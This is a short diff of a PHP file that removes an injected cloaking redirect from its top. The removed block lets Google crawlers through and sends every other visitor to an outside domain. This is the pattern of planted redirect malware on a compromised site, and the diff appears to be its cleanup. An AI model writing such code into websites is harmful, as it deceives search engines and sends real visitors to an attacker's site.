@@ -1,16 +1,4 @@
 <?php
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-
-if (strpos($userAgent, 'Googlebot') !== false || 
-    strpos($userAgent, 'Google-Site-Verification') !== false || 
-    strpos($userAgent, 'Google-InspectionTool') !== false) {
-} else {
-    header("Location: https://lanciaolu.me/mekihitam");
-    exit();
-}
-?>
-
-<?php
 
 function feedback404()
 {
